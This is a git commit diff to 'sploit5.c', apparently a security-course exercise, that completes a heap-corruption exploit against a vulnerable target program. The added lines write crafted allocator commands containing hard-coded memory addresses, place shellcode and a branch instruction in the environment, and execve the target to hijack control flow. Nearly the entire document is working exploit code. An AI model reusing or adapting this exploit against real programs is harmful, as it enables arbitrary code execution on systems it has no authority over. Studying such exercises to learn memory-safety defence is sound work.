cdaa01bf9c7729a65414ca428985ef9bf034ce34
gensone <f.marcantoni94@gmail.com>
2017-10-01 04:28:09 +0000

    sploit5 completed and txt updated

--- sploits/sploit5.c
+++ sploits/sploit5.c
@@ -11,19 +11,27 @@
 int main(void)
 {
 	int fd;
+	char cmd[26];
 	char arg1[] = "sploit5-cmds";
 	char *args[] = { TARGET, arg1, NULL };
-	char *env[] = { NULL };
+	char shell[38];
+	char j[5];
+	strcpy(shell, shellcode);
+	*(unsigned*)(&j) = 0xeafffff3; //26
+	shell[37]='\0';
+        j[4]='\0';	
+	char *env[] = { shellcode, "AAAAA", j, NULL };
 	
 	fd = open(arg1, O_CREAT | O_RDWR, 0666);
-	write(fd, "create 0 a\n", 11);
-	write(fd, "create 1 bbbb\n", 14);
-	write(fd, "create 2 cccccccccccccccccccccccc\n", 34);
+	write(fd, "create 0 aaaa\n", 14);
+	write(fd, "create 1 aaaaaa\n", 16);
+	write(fd, "create 2 aaaaaaaaaaaaaaaaaaaaaaaaaaa\n", 37);
 	write(fd, "combine 2 1 2\n", 14);
-	write(fd, "create 0 aaaaaaaaaaaa\xbd\xfd\xff\xbe\n", 26);
+	write(fd, "create 0 aaaaaaaa\xea\xff\xff\xbe\x8d\xfd\xff\xbe\n", 26);
 	write(fd, "delete 1\n", 9);
 	close(fd);
 
+	
 	if (0 > execve(TARGET, args, env))
 		fprintf(stderr, "execve failed.\n");
 
